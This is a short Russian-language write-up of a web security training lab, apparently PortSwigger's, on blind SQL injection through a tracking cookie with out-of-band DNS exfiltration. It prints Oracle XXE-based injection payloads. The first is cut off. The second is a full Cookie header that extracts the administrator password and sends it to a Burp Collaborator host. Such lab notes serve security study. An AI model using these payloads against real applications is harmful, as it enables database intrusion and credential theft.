Описание:
Эта лабораторная работа содержит уязвимость слепой SQL-инъекции. Приложение использует отслеживающую cookie для аналитики и выполняет SQL-запрос, содержащий значение отправленной cookie.
SQL-запрос выполняется асинхронно и не влияет на ответ приложения.
Чтобы решить лабораторию, используйте уязвимость SQL-инъекции, чтобы вызвать DNS-запрос к Burp Collaborator.

Payload:
```
x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE root+[+<!ENTITY+%25+remote+SYSTEM+"http://u83jkk7ox8guwd42kc3rhr3nfel
```

Данный paloyad приводит к отправке запроса на DNS:
![](../../../z.%20Images/{218DD042-B6CD-4B0D-9AD0-5CFC0BBA7915}.png)

Payload:
```
Cookie: TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT password FROM users WHERE username='administrator')||'.t1vidj0nq79tpcx1dbwqaqwm8de62wql.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

Запрос на домен:
![](../../../z.%20Images/{E7F1738C-C48B-47AA-8A56-C1A956E975AD}.png)

`ekszd74do9u0fq4gzvw4` - это и есть пароль от учётной записи `administrator`.

Проверка:
![](../../../z.%20Images/{F8415CF5-B0D0-4C98-9BCD-051720E0E438}.png)